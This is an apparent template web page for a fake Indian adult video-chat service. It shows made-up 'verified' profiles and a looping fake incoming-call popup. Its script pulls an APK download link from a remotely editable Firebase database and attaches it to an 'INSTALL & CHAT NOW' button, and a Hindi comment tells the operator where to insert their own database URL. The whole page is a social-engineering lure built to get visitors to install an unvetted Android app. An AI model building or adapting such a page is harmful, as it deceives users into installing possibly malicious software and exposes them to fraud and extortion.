<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SexyChat | Desi Private Chat</title>
    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@600&family=Poppins:wght@300;600&display=swap" rel="stylesheet">
    <style>
        :root { --desi-pink: #ff0055; --dark-velvet: #120107; --gold: #ffd700; }
        body { margin: 0; padding: 0; font-family: 'Poppins', sans-serif; background-color: var(--dark-velvet); color: white; text-align: center; }
        header { padding: 40px 15px; background: linear-gradient(180deg, #3d0014 0%, var(--dark-velvet) 100%); border-bottom: 1px solid rgba(255, 0, 85, 0.3); }
        header h1 { font-family: 'Teko', sans-serif; font-size: 3.8rem; margin: 0; color: var(--desi-pink); text-shadow: 0 0 20px rgba(255, 0, 85, 0.6); letter-spacing: 2px; }
        .verified-banner { background: var(--desi-pink); color: white; font-size: 12px; padding: 5px; font-weight: bold; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 15px; }
        .card { background: #222; border-radius: 20px; overflow: hidden; position: relative; border: 1px solid rgba(255, 255, 255, 0.1); }
        .card img { width: 100%; height: 250px; object-fit: cover; }
        .status { position: absolute; top: 10px; left: 10px; background: rgba(0, 0, 0, 0.7); padding: 4px 10px; border-radius: 20px; font-size: 10px; color: #00ff00; border: 1px solid #00ff00; }
        .info { position: absolute; bottom: 0; width: 100%; padding: 15px 10px; background: linear-gradient(0deg, black, transparent); text-align: left; }
        #call-popup { position: fixed; top: 20px; left: 50%; transform: translateX(-50%) scale(0); width: 90%; max-width: 400px; background: white; color: #333; padding: 15px; border-radius: 20px; display: flex; align-items: center; box-shadow: 0 20px 40px rgba(0,0,0,0.5); transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 2000; }
        .footer { position: fixed; bottom: 0; width: 100%; padding: 20px; background: linear-gradient(transparent, #000); z-index: 1000; }
        .install-btn { display: block; background: linear-gradient(45deg, #ff0055, #ff5d8f); color: white; text-decoration: none; padding: 20px; border-radius: 50px; font-size: 1.4rem; font-weight: bold; box-shadow: 0 10px 30px rgba(255, 0, 85, 0.5); animation: bounce 2s infinite; }
        @keyframes bounce { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    </style>
</head>
<body>
    <div class="verified-banner">‚úì 100% VERIFIED DESI PROFILES ONLY</div>
    <header>
        <h1>SexyChat</h1>
        <p style="color: var(--gold); margin:0;">Abhi Call Karein Aur Baat Karein</p>
    </header>

    <div id="call-popup">
        <div style="font-size: 30px; margin-right: 15px;">üìû</div>
        <div><b id="caller-name">Pooja</b> is calling you...<br><small style="color: #ff0055;">Accept to Start Video Chat</small></div>
    </div>

    <div class="grid">
        <div class="card"><div class="status">‚óè LIVE</div><img src="https://images.unsplash.com/photo-1621184455862-c163dfb30e0f?w=400"><div class="info"><b>Riya, 21</b><br><small>üìç Delhi</small></div></div>
        <div class="card"><div class="status">‚óè ONLINE</div><img src="https://images.unsplash.com/photo-1589156223104-716b940e4f2e?w=400"><div class="info"><b>Sneha, 23</b><br><small>üìç Mumbai</small></div></div>
        <div class="card"><div class="status">‚óè LIVE</div><img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=400"><div class="info"><b>Anjali, 22</b><br><small>üìç Bangalore</small></div></div>
        <div class="card"><div class="status">‚óè ONLINE</div><img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=400"><div class="info"><b>Neha, 24</b><br><small>üìç Lucknow</small></div></div>
    </div>

    <div style="height: 120px;"></div>

    <div class="footer">
        <a href="#" id="main-link" class="install-btn">CONNECTING...</a>
    </div>

    <script>
        // --- CONFIGURATION ---
        // 1. Apna Firebase URL yahan dalein (Last mein /apk_link.json)
        const FIREBASE_DB = "https://kdktogov-default-rtdb.firebaseio.com/apk_link.json";

        // --- DYNAMIC LINK LOGIC ---
        async function fetchLink() {
            const btn = document.getElementById('main-link');
            try {
                const res = await fetch(FIREBASE_DB);
                const link = await res.json();
                if(link) {
                    btn.href = link;
                    btn.innerText = "INSTALL & CHAT NOW üî•";
                }
            } catch (e) { btn.innerText = "DOWNLOAD NOW"; }
        }
        fetchLink();

        // --- POPUP LOGIC ---
        const names = ["Pooja", "Sonia", "Kavya", "Mehak", "Tanya"];
        setInterval(() => {
            document.getElementById('caller-name').innerText = names[Math.floor(Math.random()*names.length)];
            const p = document.getElementById('call-popup');
            p.style.transform = "translateX(-50%) scale(1)";
            setTimeout(() => { p.style.transform = "translateX(-50%) scale(0)"; }, 5000);
        }, 10000);
    </script>
</body>
</html>
